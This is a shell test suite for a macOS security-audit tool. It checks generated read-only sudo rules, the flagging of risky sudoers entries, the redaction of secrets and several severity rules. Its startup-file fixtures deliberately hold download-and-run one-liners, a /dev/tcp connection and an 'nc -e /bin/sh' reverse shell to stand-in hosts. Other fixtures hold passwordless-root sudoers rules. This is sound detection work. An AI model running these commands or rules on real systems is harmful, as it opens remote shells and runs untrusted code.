#!/bin/bash
# Fixture tests for the logic functions in macassay. Development only; not shipped.
# Usage: dev/test.sh   (no root, no network; exits non-zero when a case fails)

cd "$(dirname "$0")/.." || exit 1
# shellcheck source=/dev/null  # the suite lints macassay on its own
MACASSAY_LIB=1 . ./macassay
T=$(mktemp -d /tmp/macassay-test.XXXXXX) || exit 1
# A watchdog stops the suite after 60 seconds, so a hang fails instead of stalling.
( sleep 60; echo "FAIL suite timed out after 60 seconds" >&2; kill -TERM $$ ) & WD=$!
trap '{ kill "$WD"; wait "$WD"; } 2>/dev/null; rm -rf "$T"' EXIT

FAILS=0
check() { local name="$1"; shift; if "$@"; then echo "ok   $name"; else echo "FAIL $name"; FAILS=$((FAILS+1)); fi; }
has()   { grep -qF -- "$2" "$1"; }
hasnt() { ! grep -qF -- "$2" "$1"; }
not()   { ! "$@"; }
visudo_ok() { /usr/sbin/visudo -c -f "$1" >/dev/null 2>&1; }

ACCTS='account root 0 /var/root
account alice 501 /Users/alice
account bob 502 /Users/bob
account _www 70 /Library/WebServer
sudoersd macassay
sudoersd extra_rules'

# F1: a normal account list gives a valid file for the granted user.
printf '%s\n' "$ACCTS" | gen_rules bob arm64 > "$T/f1" 2> "$T/f1.err"
check "F1 gen_rules exit status" [ $? -eq 0 ]
check "F1 visudo accepts the rules" visudo_ok "$T/f1"
check "F1 rules for alice" has "$T/f1" "/usr/bin/ssh-keygen -l -f /Users/alice/.ssh/authorized_keys"
check "F1 rules for root" has "$T/f1" "/bin/ls -ln /var/root/Library/LaunchAgents"
check "F1 no rules for the granted user" hasnt "$T/f1" "/Users/bob"
check "F1 no rules for system accounts" hasnt "$T/f1" "/Library/WebServer"
check "F1 sudoers.d files" has "$T/f1" "/bin/cat /etc/sudoers.d/extra_rules"
check "F1 always_set_home follows the alias" [ "$(grep -n 'Cmnd_Alias' "$T/f1" | cut -d: -f1)" -lt "$(grep -n 'always_set_home' "$T/f1" | cut -d: -f1)" ]
check "F1 grant line" has "$T/f1" "bob ALL = (root) NOPASSWD: MACASSAY"

# F2: no wildcards, no ALL in a command, no shell or interpreter, bputil only on Apple silicon.
grep '^    /' "$T/f1" > "$T/f2.cmds"
check "F2 no * in any rule" hasnt "$T/f1" "*"
check "F2 no ALL in a command" hasnt "$T/f2.cmds" "ALL"
check "F2 no shell, interpreter, editor or sqlite3" [ -z "$(awk '{print $1}' "$T/f2.cmds" | grep -E '/(ba|z|k|c|tc|da)?sh$|python|perl|ruby|osascript|vim?$|nano|emacs|sqlite3|env$')" ]
check "F2 bputil on arm64" has "$T/f1" "/usr/bin/bputil -d"
printf '%s\n' "$ACCTS" | gen_rules bob x86_64 > "$T/f2.intel" 2>/dev/null
check "F2 no bputil on Intel" hasnt "$T/f2.intel" "bputil"

# F3: hostile account names, home folders and sudoers.d names are skipped with a warning.
HOSTILE="$ACCTS
account bad,name 503 /Users/badname
account ev*l 504 /Users/evil
account dots 505 /Users/../etc
account outside 506 /tmp/x
account -dash 507 /Users/dash
account colon:x 508 /Users/c
account eq=x 509 /Users/e
account paren( 510 /Users/p
account back\\slash 511 /Users/b
account spacey 512 /Users/with space
account root 0 /Users/rootfake
sudoersd bad.name
sudoersd st*r
sudoersd br[acket
sudoersd with space"
printf '%s\n' "$HOSTILE" | gen_rules bob arm64 > "$T/f3" 2> "$T/f3.err"
check "F3 gen_rules still succeeds" [ $? -eq 0 ]
check "F3 visudo accepts the rules" visudo_ok "$T/f3"
for bad in badname evil "/Users/../etc" /tmp/x /Users/dash /Users/c /Users/e /Users/p /Users/b "with space" rootfake bad.name "st*r" "br[acket"; do
  check "F3 skips $bad" hasnt "$T/f3" "$bad"
done
check "F3 warns for each skipped item" [ "$(grep -c Skipping "$T/f3.err")" -ge 15 ]

# F4: the granted user must exist and be a regular account.
for u in root _www nosuch "bad name"; do
  printf '%s\n' "$ACCTS" | gen_rules "$u" arm64 > /dev/null 2>&1
  check "F4 refuses granted user '$u'" [ $? -ne 0 ]
done
# A name that reads as a sudoers alias, or ALL, would widen the grant line.
for u in ALL ADMIN_1; do
  printf '%s\naccount %s 503 /Users/%s\n' "$ACCTS" "$u" "$u" | gen_rules "$u" arm64 > /dev/null 2>&1
  check "F4 refuses alias-like user '$u'" [ $? -ne 0 ]
done

# F5: sudo refusals are told apart from a command's own failure.
printf 'sudo: a password is required\n' > "$T/e1"
printf "Sorry, user bob is not allowed to execute '/bin/cat /x' as root on host.\n" > "$T/e2"
printf 'sudo: /usr/bin/bputil: command not found\n' > "$T/e3"
printf 'ls: /Users/alice/.zlogin: No such file or directory\n' > "$T/e4"
: > "$T/e5"
check "F5 password required is a refusal" classify_refusal 1 "$T/e1"
check "F5 not allowed is a refusal" classify_refusal 1 "$T/e2"
check "F5 missing command is a refusal" classify_refusal 1 "$T/e3"
check "F5 command failure is not a refusal" not classify_refusal 1 "$T/e4"
check "F5 success is not a refusal" not classify_refusal 0 "$T/e5"

# F6: NOPASSWD rules are found and rated.
cat > "$T/sudoers" <<'EOF'
# alice ALL = (ALL) NOPASSWD: ALL   (a comment)
Defaults env_reset
%admin ALL = (ALL) ALL
alice ALL = (ALL) NOPASSWD: ALL
bob ALL = (root) NOPASSWD: /bin/kill
carol ALL = NOPASSWD:ALL
dave ALL = (root) NOPASSWD: ALLOWED_CMDS
erin ALL = (root) \
    NOPASSWD: ALL
Cmnd_Alias X = /bin/a, \
    /bin/b
#501 ALL = (ALL) NOPASSWD: ALL
frank ALL = (root) NOPASSWD: SETENV: ALL
gina ALL = (root) NOPASSWD:/bin/ls,ALL
#includedir /private/etc/sudoers.d
EOF
classify_sudoers < "$T/sudoers" > "$T/f6"
check "F6 six NOPASSWD: ALL rules are HIGH" [ "$(cut -f2 "$T/f6" | grep -c '^HIGH')" -eq 6 ]
check "F6 a #UID rule is not a comment" has "$T/f6" "#501 ALL = (ALL) NOPASSWD: ALL"
check "F6 two other NOPASSWD rules are LOW" [ "$(cut -f2 "$T/f6" | grep -c '^LOW')" -eq 2 ]
check "F6 IDs for the two risks" [ "$(cut -f1 "$T/f6" | sort -u | paste -sd, -)" = "MA-ACCOUNTS-005,MA-ACCOUNTS-006" ]
check "F6 continued line joined" has "$T/f6" "erin ALL = (root) NOPASSWD: ALL"
check "F6 comments, includes and Defaults ignored" [ "$(wc -l < "$T/f6" | tr -d ' ')" -eq 8 ]

# F7: allow-lists keep settings and drop identifiers.
# The bputil fixture follows real macOS 27.2 output, with identifiers replaced.
cat > "$T/bputil" <<'EOF'
OS Type                                       : macOS
Local Policy Nonce Hash                 (lpnh): 1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF
Unique Chip ID                          (ECID): 0x123456789ABCDE
Security Mode                           (CSEC): 1
Volume Group UUID                       (vuid): 11111111-2222-3333-4444-555555555555
Security Mode:               Reduced    (smb0): 1
3rd Party Kexts Status:      Enabled    (smb2): 1
DEP-allowed MDM Control:     Enabled    (smb4): 1
SIP Status:                  Enabled    (sip0): absent
EOF
filter_bputil < "$T/bputil" > "$T/f7b"
check "F7 bputil keeps the security mode" has "$T/f7b" "Security Mode:               Reduced"
check "F7 bputil keeps SIP" has "$T/f7b" "SIP Status"
check "F7 bputil keeps kexts" has "$T/f7b" "Kexts Status"
check "F7 bputil drops UUIDs, hashes and the chip ID" [ -z "$(grep -E '1111|ABCDEF|ECID' "$T/f7b")" ]
check "F7 bputil mode from the smb0 line" [ "$(bputil_mode < "$T/bputil")" = Reduced ]
check "F7 bputil mode Full" [ "$(printf 'Security Mode                           (CSEC): 1\nSecurity Mode:               Full       (smb0): absent\n' | bputil_mode)" = Full ]
cat > "$T/profiles" <<'EOF'
There are 2 configuration profiles installed
_computerlevel[1] attribute: name: Wi-Fi
_computerlevel[1] attribute: profileIdentifier: com.example.wifi
_computerlevel[1] attribute: profileUUID: 11111111-2222-3333-4444-555555555555
_computerlevel[2] attribute: name: 22222222-3333-4444-5555-666666666666
_computerlevel[1] attribute: organization: Example
_computerlevel[1] attribute: installationDate: 2026-01-01
EOF
filter_profiles < "$T/profiles" > "$T/f7p"
check "F7 profiles keeps names, identifiers, organization" [ "$(wc -l < "$T/f7p" | tr -d ' ')" -eq 4 ]
check "F7 profiles drops UUIDs" [ -z "$(grep -E '1111|2222' "$T/f7p")" ]

# F8: startup-file matches name the pattern and never copy the line.
cat > "$T/rc" <<'EOF'
curl -s https://x.example | sh   # SECRET_TOKEN_1
export X=$(echo abc | base64 -D) SECRET_TOKEN_2
bash -c "$(curl -fsSL https://y.example)" SECRET_TOKEN_3
wget -qO- z.example | bash
cat a | bash -s
eval "$(curl q.example)"
exec 3<>/dev/tcp/192.0.2.1/80
nc -e /bin/sh h.example
osascript -e 'beep'
echo harmless
EOF
rc_hits "$T/rc" "$T/missing" > "$T/f8"
check "F8 no line text in the output" [ -z "$(grep -E 'SECRET|example|harmless' "$T/f8")" ]
for want in "1: download piped to a shell" "2: base64 decode" "3: shell running a download" "4: download piped to a shell" \
            "5: shell reading a script from a pipe" "6: eval of a download" "7: /dev/tcp connection" "8: nc with -e" "9: osascript -e"; do
  check "F8 finds $want" has "$T/f8" "$T/rc:$want"
done
check "F8 no match on a harmless line" hasnt "$T/f8" "$T/rc:10:"

# F9: SSH methods that accept a password.
check "F9 password" ssh_accepts_password "(publickey,password)"
check "F9 keyboard-interactive" ssh_accepts_password "(publickey,keyboard-interactive)"
check "F9 publickey alone" not ssh_accepts_password "(publickey)"

# F10: report text from the audited Mac stays in one cell.
# shellcheck disable=SC2016  # the backticks are literal test input
out=$(printf 'evil\nHIGH\tArea|x`y`\rz' | clean_field)
check "F10 one line" [ "$(printf '%s\n' "$out" | wc -l | tr -d ' ')" -eq 1 ]
check "F10 no tab, pipe or backtick" [ -z "$(printf '%s' "$out" | tr -d -c '\t|`')" ]
check "F10 text kept" [ "$out" = "evil HIGH Area/xy z" ]

# F11: dashed UUIDs anywhere in the report are replaced.
out=$(printf '/Library/SystemExtensions/688AE699-C0FB-4B23-91E1-6ACB69076699/x and abcdefab-cdef-abcd-efab-cdef00000050\n' | redact_ids)
check "F11 UUIDs replaced" [ "$out" = "/Library/SystemExtensions/<UUID>/x and <UUID>" ]

# F12: crontab lines show the schedule and command name, never arguments or values.
printf '%s\n' '# comment' 'API_KEY=SECRET_A' '*/5 * * * * /usr/bin/curl -H "Authorization: SECRET_B" https://x' \
  '@reboot /Users/x/bin/start.sh SECRET_C' '0 3 * * * TOKEN=SECRET_D /bin/run' | crontab_summary > "$T/f12"
check "F12 no secrets" [ -z "$(grep SECRET "$T/f12" | grep -v 'API_KEY (value hidden)')" ]
check "F12 variable named without value" has "$T/f12" "environment variable API_KEY (value hidden)"
check "F12 schedule and command" has "$T/f12" "*/5 * * * *  curl (arguments hidden)"
check "F12 @reboot entry" has "$T/f12" "@reboot  start.sh (arguments hidden)"
check "F12 inline variables hidden" has "$T/f12" "0 3 * * *  (command with inline variables) (arguments hidden)"

# F13: a program owned by this user is HIGH.
touch "$T/prog"
check "F13 user-owned program is HIGH" [ "$(chain_writable "$T/prog" | cut -f1)" = HIGH ]

# F14: a failed install rollback is reported, not claimed as restored.
mkdir "$T/sd"
sudoers_ok() { ! grep -qs BAD "$RULES"; }
( RULES="$T/sd/macassay"; TMP="$T/r1"; mkdir "$TMP"; echo BAD > "$RULES"
  rollback_rules && [ ! -e "$RULES" ] ) 2>/dev/null
check "F14 no backup: bad file removed, rollback succeeds" [ $? -eq 0 ]
( RULES="$T/sd/macassay"; TMP="$T/r2"; mkdir "$TMP"; echo BAD > "$RULES"; echo good > "$TMP/old"
  rollback_rules ) 2>/dev/null
check "F14 backup not installable: rollback returns 2" [ $? -eq 2 ]
check "F14 backup not installable: bad file removed" [ ! -e "$T/sd/macassay" ]
check "F14 no .macassay.new left behind" [ ! -e "$T/sd/.macassay.new" ]
( RULES="$T/sd/macassay"; TMP="$T/r3"; mkdir "$TMP"; sudoers_ok() { false; }; echo BAD > "$RULES"
  rollback_rules ) 2>/dev/null
check "F14 sudo still broken: rollback returns 1" [ $? -eq 1 ]

# F15: every finding call names a literal ID, or "$id" from a function that prints literal IDs, and one of the 14 section labels.
LABELS="Health Backups Updates Platform Management Sharing Network Persistence Apps Accounts Credentials Developer Trust Events"
LABRE=$(echo "$LABELS" | tr 'a-z ' 'A-Z|')
grep -v '^[[:space:]]*#' macassay | grep -oE '(^|[^A-Za-z_])finding [A-Z"$][^ ]* [^ ]+ [^ ]+' | sed -E 's/^[^f]*//' > "$T/f15"
check "F15 finding calls found" [ "$(grep -c . "$T/f15")" -ge 57 ]
check "F15 every call has a literal ID or \$id" [ -z "$(awk '$2 !~ /^(MA-[A-Z]+-[0-9][0-9][0-9]|"\$id")$/' "$T/f15")" ]
check "F15 every call names a section label" [ -z "$(awk -v l=" $LABELS " 'index(l, " " $4 " ") == 0' "$T/f15")" ]
check "F15 no flag calls left" [ -z "$(grep -v '^[[:space:]]*#' macassay | grep -E '(^|[;&|{()]|then|do|else)[[:space:]]*flag ')" ]

# F16: every ID has a section label and three digits; call sites share an ID only where listed (one risk at two severities or two places).
grep -oE 'MA-[A-Za-z]+-[0-9]+' macassay | sort > "$T/f16"
check "F16 every ID has a label and three digits" [ -z "$(grep -vxE "MA-($LABRE)-[0-9]{3}" "$T/f16")" ]
grep -oE 'finding MA-[A-Z]+-[0-9]+' macassay | sort | uniq -d > "$T/f16d"
check "F16 shared IDs are only the listed ones" [ -z "$(grep -vxE 'finding (MA-HEALTH-003|MA-SHARING-007|MA-PLATFORM-009|MA-UPDATES-003)' "$T/f16d")" ]

# G1: long hex runs in certificate labels are masked; dashed UUIDs are still replaced.
h32=0123456789abcdef0123456789ABCDEF; h31=${h32:0:31}
check "G1 32 hex characters masked" [ "$(echo "CA $h32" | mask_hex)" = "CA <ID>" ]
check "G1 64 hex characters masked" [ "$(echo "CA $h32$h32 x" | mask_hex)" = "CA <ID> x" ]
check "G1 31 hex characters kept" [ "$(echo "CA $h31" | mask_hex)" = "CA $h31" ]
check "G1 redact_ids still replaces a UUID" [ "$(echo 11111111-2222-3333-4444-555555555555 | redact_ids)" = "<UUID>" ]

# G2, G17: trust settings count by the SecTrustSettings.h rule; names are masked and policy strings dropped.
cat > "$T/trust" <<'EOF'
Number of trusted certs = 5
Cert 0: Root A 0123456789abcdef0123456789abcdef
   Number of trust settings : 1
   Trust Setting 0:
      Policy OID            : SSL
      Policy String         : 192.0.2.10
      Result Type           : kSecTrustSettingsResultTrustRoot
Cert 1: No Result B
   Number of trust settings : 1
   Trust Setting 0:
      Policy OID            : SSL
Cert 2: Always C
   Number of trust settings : 0
Cert 3: Denied D
   Number of trust settings : 1
   Trust Setting 0:
      Result Type           : kSecTrustSettingsResultDeny
Cert 4: Unspecified E
   Number of trust settings : 1
   Trust Setting 0:
      Result Type           : kSecTrustSettingsResultUnspecified
EOF
trusted_certs < "$T/trust" | mask_hex > "$T/g17"
check "G17 TrustRoot, no result and zero settings count" [ "$(grep -c . "$T/g17")" -eq 3 ]
check "G17 Deny and Unspecified do not count" [ -z "$(grep -E 'Denied|Unspecified' "$T/g17")" ]
check "G2 names kept and masked" has "$T/g17" "Root A <ID>"
check "G2 policy strings dropped" hasnt "$T/g17" "192.0.2.10"

# G20: admin-group write is MEDIUM only under /Applications; group write counts when the group has other members.
( stat() { case "$3" in /Applications) echo "root drwxrwxr-x admin" ;; *) echo "root drwxr-xr-x wheel" ;; esac; }
  [ "$(chain_writable /Applications | cut -f1)" = MEDIUM ] )
check "G20 admin-writable folder under /Applications is MEDIUM" [ $? -eq 0 ]
( stat() { case "$3" in /Library) echo "root drwxrwxr-x admin" ;; *) echo "root drwxr-xr-x wheel" ;; esac; }
  [ "$(chain_writable /Library | cut -f1)" = HIGH ] )
check "G20 admin-writable folder under /Library is HIGH" [ $? -eq 0 ]
printf 'bob ALL = (root) NOPASSWD: %s\n' "$T/prog" | sudoers_findings /etc/sudoers > "$T/g20s"
check "G20 NOPASSWD for a user-writable program is HIGH" [ "$(cut -f1,2 "$T/g20s")" = $'MA-ACCOUNTS-008\tHIGH' ]
( chain_writable() { printf 'MEDIUM\tadmin group can write /Applications\n'; }
  printf 'bob ALL = (root) NOPASSWD: /Applications/Tool\n' | sudoers_findings /etc/sudoers | cut -f1,2 | grep -qx $'MA-ACCOUNTS-008\tHIGH' )
check "G20 NOPASSWD for an admin-writable program is HIGH" [ $? -eq 0 ]
( group_has_others() { [ "$1" = 20 ]; }
  printf '%s\n' '-rw-rw-r--  1 501  20  10 Nov 1 10:00 /Users/a/.zshrc' \
                '-rw-r--r--  1 502  20  10 Nov 1 10:00 /Users/a/.bashrc' \
                '-rw-r--r--  1 0  0  10 Nov 1 10:00 /Users/a/.profile' \
                '-rw-rw-r--  1 501  99  10 Nov 1 10:00 /Users/a/.zshenv' \
                '-rw-r--rw-  1 0  0  10 Nov 1 10:00 /Users/a/.zlogin' | rc_file_risks 501 a ) > "$T/g20rc"
check "G20 rc file writable by staff" has "$T/g20rc" $'/Users/a/.zshrc\twritable by group 20'
check "G20 rc file owned by another account" has "$T/g20rc" $'/Users/a/.bashrc\towned by UID 502'
check "G20 root-owned rc file gives nothing" hasnt "$T/g20rc" ".profile"
check "G20 group without other members gives nothing" hasnt "$T/g20rc" ".zshenv"
check "G20 rc file writable by everyone" has "$T/g20rc" ".zlogin"

# R7: severity rules for the startup-pattern split, the secure boot mode and the temporary-folder program.
printf '%s\n' 'echo x | base64 -d' "osascript -e 'beep'" > "$T/g21a"
printf '%s\n' 'curl -s https://x.example | sh' 'echo x | base64 -d' > "$T/g21b"
echo harmless > "$T/g21c"
for k in a b c; do rc_hits "$T/g21$k" > "$T/g21$k.h"; rc_pattern_sevs "$T/g21$k.h" > "$T/g21$k.s"; done
check "R7 base64 and osascript only give MEDIUM" [ "$(paste -sd, - < "$T/g21a.s")" = MEDIUM ]
check "R7 download-and-run plus base64 give HIGH and MEDIUM" [ "$(paste -sd, - < "$T/g21b.s")" = HIGH,MEDIUM ]
check "R7 no hits give nothing" [ ! -s "$T/g21c.s" ]
check "R7 boot mode Full gives nothing" [ -z "$(boot_policy_sev Full)" ]
check "R7 boot mode empty gives nothing" [ -z "$(boot_policy_sev '')" ]
check "R7 boot mode Reduced is MEDIUM" [ "$(boot_policy_sev Reduced)" = MEDIUM ]
check "R7 boot mode Permissive is HIGH" [ "$(boot_policy_sev Permissive)" = HIGH ]
check "R7 App Translocation path is not a temporary program" not temp_program /private/var/folders/ab/T/AppTranslocation/X/d/X.app/Contents/MacOS/X
check "R7 plain /private/var/folders path is a temporary program" temp_program /private/var/folders/ab/T/x/prog
check "R7 /Users/Shared path is a temporary program" temp_program /Users/Shared/prog
check "R7 /Applications program is not a temporary program" not temp_program /Applications/X.app/Contents/MacOS/X

# G11: missing update settings print the macOS default; the SoftwareUpdate domain is read one key at a time.
BODY="$T/g11"; : > "$BODY"
default_line "Automatic checks (AutomaticCheckEnabled)" "" "1, on"
default_line "Automatic download (AutomaticDownload)" 0 "1, on"
check "G11 missing key prints the macOS default" has "$T/g11" "- Automatic checks (AutomaticCheckEnabled): not set (macOS default: 1, on)"
check "G11 set key prints its value" has "$T/g11" "- Automatic download (AutomaticDownload): 0"
check "G11 no whole-domain read of SoftwareUpdate" [ -z "$(grep -E 'defaults read [^ ]*SoftwareUpdate[^ ]* *(2>/dev/null)? *(\||$)' macassay)" ]
check "G11 AutoInstallProductKeys is never read" hasnt macassay "AutoInstallProductKeys"

# G21: recent installs list non-Apple installs since the cutoff, without nested package lists.
cat > "$T/ih" <<'EOF'
[
  0 => {
    "date" => 2026-10-01 05:33:25 +0000
    "displayName" => "macOS 27.1"
    "displayVersion" => "27.1"
    "processName" => "softwareupdated"
  }
  1 => {
    "date" => 2026-11-20 05:39:05 +0000
    "displayName" => "Example App"
    "displayVersion" => "2.0"
    "packageIdentifiers" => [
      0 => "com.example.app"
    ]
    "processName" => "installer"
  }
  2 => {
    "date" => 2026-09-01 01:00:00 +0000
    "displayName" => "Old App"
    "displayVersion" => "1.0"
    "processName" => "installer"
  }
]
EOF
recent_installs 2026-10-25 < "$T/ih" > "$T/g21"
check "G21 recent non-Apple install listed" has "$T/g21" "2026-11-20  Example App 2.0"
check "G21 Apple and old installs skipped" [ "$(grep -c . "$T/g21")" -eq 1 ]

# G9: screen lock severities from sysadminctl text.
check "G9 immediate gives nothing" [ -z "$(screen_lock_sev 'screenLock delay is immediate')" ]
check "G9 5 seconds gives nothing" [ -z "$(screen_lock_sev 'screenLock delay is 5 seconds')" ]
check "G9 900 seconds is LOW" [ "$(screen_lock_sev 'screenLock delay is 900 seconds' | cut -f1)" = LOW ]
check "G9 7200 seconds is MEDIUM" [ "$(screen_lock_sev 'screenLock delay is 7200 seconds' | cut -f1)" = MEDIUM ]
check "G9 off is MEDIUM" [ "$(screen_lock_sev 'screenLock is off' | cut -f1)" = MEDIUM ]
check "G15 one screen lock finding call" [ "$(grep -c 'finding MA-PLATFORM-010' macassay)" -eq 1 ]
# G10: boot arguments.
check "G10 no boot arguments" [ -z "$(boot_args_sev '')" ]
check "G10 -v is LOW" [ "$(boot_args_sev '-v')" = LOW ]
check "G10 amfi argument is HIGH" [ "$(boot_args_sev 'amfi_get_out_of_my_way=1')" = HIGH ]

# G19: printer sharing from cupsd.conf.
printf 'Listen localhost:631\nListen /private/var/run/cupsd\n' > "$T/cups1"
printf 'Port 631\nListen /private/var/run/cupsd\n' > "$T/cups2"
printf 'Listen *:631\n' > "$T/cups3"
check "G19 localhost only is off" not cups_shared "$T/cups1"
check "G19 Port line is on" cups_shared "$T/cups2"
check "G19 Listen on all addresses is on" cups_shared "$T/cups3"

# G16, G18: PAM modules, bracketed controls, and include loops.
mkdir "$T/pam"
printf 'auth include other_file\nauth [success=ok default=die] /opt/evil/pam_x.so\naccount required pam_permit.so\nauth required /usr/lib/pam/pam_ok.so\n' > "$T/pam/svc"
printf 'auth substack svc\nsession optional /Users/Shared/pam_y.so\n' > "$T/pam/other_file"
( PAMD="$T/pam"; PAM_SEEN=""; pam_modules "$T/pam/svc" 1 ) > "$T/g16"
check "G16 bracketed control field" has "$T/g16" "/opt/evil/pam_x.so"
check "G16 module in an included file" has "$T/g16" "/Users/Shared/pam_y.so"
check "G18 include loop reads each file once" [ "$(grep -c . "$T/g16")" -eq 2 ]
# G15: one finding per authorization plugin, at its highest severity.
check "G15 unsigned, user-writable plugin gives one HIGH" [ "$(auth_plugin_finding unsigned $'HIGH\tx is owned by bob')" = $'MA-PERSISTENCE-012\tHIGH' ]
check "G15 unsigned plugin is MEDIUM" [ "$(auth_plugin_finding unsigned '')" = $'MA-PERSISTENCE-013\tMEDIUM' ]
check "G15 plugin signed by a developer is LOW" [ "$(auth_plugin_finding 'Team ABCDE12345' '')" = $'MA-PERSISTENCE-014\tLOW' ]
check "G15 Apple plugin gives nothing" [ -z "$(auth_plugin_finding Apple '')" ]

# G23: remote-support tool names from ps paths.
rs() { printf '%s\n' "$1" | remote_support_names; }
check "G23 AppleVNCServer gives nothing" [ -z "$(rs /System/Library/CoreServices/RemoteManagement/AppleVNCServer.bundle/Contents/MacOS/AppleVNCServer)" ]
check "G23 TeamViewer is listed" [ "$(rs /Applications/TeamViewer.app/Contents/MacOS/TeamViewer)" = TeamViewer ]
check "G23 vncserver is listed" [ "$(rs /usr/local/bin/vncserver)" = vncserver ]
check "G23 sshd gives nothing" [ -z "$(rs /usr/sbin/sshd)" ]

# G8: debug ports. Only PIDs, classes and program paths leave the parsers.
printf '%s\n' '101 /Applications/Foo App.app/Contents/MacOS/Foo --remote-debugging-port=9222 --token=SECRET_A' \
  '102 /usr/bin/node --inspect-brk=0.0.0.0:9229 app.js' '103 /usr/bin/node --inspect-wait app.js' \
  '104 /usr/bin/node --inspect-port=9229 app.js' '105 /x/chrome --remote-debugging-pipe' \
  '106 awk / --(remote-debugging-port|inspect(-brk|-wait)?)(=|[[:space:]]|$)/ {print $1}' \
  '107 /usr/bin/node --inspect' | debug_pids > "$T/g8"
check "G8 PIDs of debug-port processes only" [ "$(paste -sd, - < "$T/g8")" = "101,102,103,107" ]
check "G8 no command text in the output" hasnt "$T/g8" "SECRET"
printf '%s\n' /usr/bin/node --inspect=0.0.0.0:9229 --token=SECRET_B | launch_debug_class > "$T/g8l"
check "G8 launch item non-loopback inspect" [ "$(cat "$T/g8l")" = nonloopback ]
check "G8 launch item output has no arguments" hasnt "$T/g8l" SECRET
check "G8 remote-debugging-address" [ "$(printf '%s\n' /x/Chrome --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0 | launch_debug_class)" = nonloopback ]
check "G8 loopback by default" [ "$(printf '%s\n' /x/Chrome --remote-debugging-port=9222 | launch_debug_class)" = loopback ]
check "G8 pipe gives nothing" [ -z "$(printf '%s\n' /x/Chrome --remote-debugging-pipe | launch_debug_class)" ]
check "G8 bind loopback" [ "$(bind_class '127.0.0.1:9222')" = loopback ]
check "G8 bind on all addresses" [ "$(bind_class $'127.0.0.1:9222\n*:9229')" = nonloopback ]
check "G8 bind unknown" [ "$(bind_class '')" = unknown ]
# G15: a debug port running and set in a launch item gives one finding.
printf '%s\n' $'/x/Foo App\tloopback\trunning' $'/x/Foo App\tnonloopback\tlaunch item a.plist' | debug_findings > "$T/g15d"
check "G15 one debug finding per program" [ "$(grep -c . "$T/g15d")" -eq 1 ]
check "G15 that finding is HIGH" [ "$(cut -f1 "$T/g15d")" = HIGH ]
# G12: native-messaging host paths.
check "G12 host in /tmp is MEDIUM" [ "$(nmh_risk /tmp/x/host)" = MEDIUM ]
check "G12 missing host is LOW" [ "$(nmh_risk /var/empty/no/such/host)" = LOW ]
check "G12 normal host gives nothing" [ -z "$(nmh_risk /bin/ls)" ]
# G13: forced extensions by source and enrollment.
cat > "$T/chrome.plist" <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict><key>ExtensionInstallForcelist</key><array>
<string>abcdefghijklmnopabcdefghijklmnop;https://clients2.google.com/service/update2/crx</string>
</array></dict></plist>
PLIST
printf '{"policies":{"ExtensionSettings":{"a@b":{"installation_mode":"force_installed"},"c@d":{"installation_mode":"allowed"}}}}\n' > "$T/policies.json"
check "G13 Chromium forced ID without its update URL" [ "$(forced_ext_ids "$T/chrome.plist" ExtensionInstallForcelist)" = abcdefghijklmnopabcdefghijklmnop ]
check "G13 Firefox policies.json forced ID only" [ "$(forced_ext_ids "$T/policies.json" policies.ExtensionSettings)" = "a@b" ]
check "G13 managed, not enrolled is HIGH" [ "$(printf 'managed\tcom.google.Chrome\tx\n' | forced_ext_finding 0 | cut -f1,2)" = $'MA-APPS-005\tHIGH' ]
check "G13 local only, not enrolled is MEDIUM" [ "$(printf 'local\tcom.google.Chrome\tx\n' | forced_ext_finding 0 | cut -f1,2)" = $'MA-APPS-006\tMEDIUM' ]
check "G13 enrolled is INFO" [ "$(printf 'managed\tcom.google.Chrome\tx\n' | forced_ext_finding 1 | cut -f1,2)" = $'MA-APPS-007\tINFO' ]

# G7: sudoers content. One line per rule, at its highest severity, with the rule text.
cat > "$T/g7" <<'EOT'
Cmnd_Alias SHELLS = /bin/sh, /bin/zsh
Defaults !authenticate
Defaults env_keep += "DYLD_LIBRARY_PATH"
Defaults	env_reset
Defaults	env_keep += "HOME MAIL"
Defaults	env_keep += "SSH_AUTH_SOCK"
Defaults	!log_allowed
a ALL = (root) NOPASSWD: ALL
b ALL = (root) NOPASSWD: /usr/bin/python3
c ALL = (root) NOPASSWD: SHELLS
d ALL = (root) NOPASSWD: /usr/bin/ssh-keygen
x ALL = (root) NOPASSWD: /bin/ls, (root) NOPASSWD: /bin/sh
y ALL = (root) NOPASSWD: /bin/ls, (operator) /bin/sh
z ALL = (root) NOPASSWD: /bin/ls, PASSWD: /bin/sh
w ALL = (root) NOPASSWD: /bin/ls, (root, operator) NOPASSWD: /bin/sh
u1 ALL = (root) NOPASSWD: sha256:0a1b2c3d4e5f /bin/sh
u2 ALL = NOPASSWD: /bin/ls, CWD=/ /bin/sh
u3 ALL = (root) NOPASSWD: SHA512:0a1b2c3d4e5f TIMEOUT=5 /usr/bin/ssh-keygen
EOT
classify_sudoers < "$T/g7" > "$T/g7.out"
check "G7 !authenticate is HIGH" has "$T/g7.out" $'MA-ACCOUNTS-010\tHIGH\tDefaults !authenticate'
check "G7 env_keep DYLD is MEDIUM" has "$T/g7.out" $'MA-ACCOUNTS-011\tMEDIUM\tDefaults env_keep += "DYLD_LIBRARY_PATH"'
check "G7 stock Defaults give nothing" [ -z "$(grep -E 'HOME MAIL|SSH_AUTH_SOCK|env_reset|log_allowed' "$T/g7.out")" ]
check "G7 NOPASSWD: ALL is HIGH" has "$T/g7.out" $'MA-ACCOUNTS-005\tHIGH\ta ALL'
check "G7 python is a code-loading program" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tb ALL'
check "G7 alias holding a shell" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tc ALL'
check "G7 ssh-keygen is not ssh" has "$T/g7.out" $'MA-ACCOUNTS-006\tLOW\td ALL'
check "G7 one line per rule" [ "$(grep -c . "$T/g7.out")" -eq 13 ]
check "G7 command with its own Runas spec and NOPASSWD" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\tx ALL'
check "G7 Runas spec after the tag carries it over" has "$T/g7.out" $'MA-ACCOUNTS-009\tHIGH\ty ALL'
check "G7 command after PASSWD is not passwordless" has "$T/g7.out" $'MA-ACCOUNTS-006\tLOW\tz ALL = (root) NOPASSWD: /bin/ls, PASSWD: /bin/sh\t/bin/ls'
